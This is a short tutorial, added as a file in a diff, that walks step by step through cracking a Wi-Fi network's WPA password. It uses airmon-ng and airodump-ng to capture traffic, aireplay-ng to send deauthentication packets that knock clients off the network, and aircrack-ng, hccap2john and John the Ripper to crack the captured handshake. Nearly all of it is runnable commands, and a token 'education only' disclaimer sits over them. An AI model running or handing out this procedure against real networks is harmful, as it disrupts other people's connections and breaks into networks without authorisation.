@@ -1,0 +1,45 @@
+Hello everyone I'm esmail and today i'm goona show you how to crack wifi by using AIRCRACK & JOHN THE RIPPER tools >>>
+
+***************************************
+ Warning *                            *
+                                      *
+1. It's for Education Purpose Only.   *
+2. All Attacks Done With Own Files.   *
+3. Don't Use In Illegal Works.        *
+***************************************
+
+^^^^^^^^^^^^^^^^^^^^^^^^^
+STEP one use Aircrack : ^
+^^^^^^^^^^^^^^^^^^^^^^^^^
+
+
+# Requirements before you start : 1- use wifi adapter 2- you have to eat rice with chicken
+
+$airmon-ng start "interface"
+
+$airodump-ng "interface name in moniter mode "
+
+$airodump-ng --bssid "Number of the bssid" --channel "choose the channel Number" --write "any name for the file" "interface name in moniter mode"
+ 
+$aireplay-ng --deauth 0 -a "bssid number" -c "station number" "interface name" 
+
+((now you get the .CAP file))
+
+
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+STEP two use John The Ripper : ^
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+
+$ aircrack-ng YourFile.cap -J YourNewfilename 
+(Now Our File Is Converted To .hccap Format But John support Hash Passwords)
+
+
+$ hccap2john Your.hccapfile > Newfilename
+(So Now We Convert .hccap file To Hash Format)
+
+$  john yourfilename
+(for cracking the file )
+
+#Now Wait 60 -80  Minutes And See Magic.
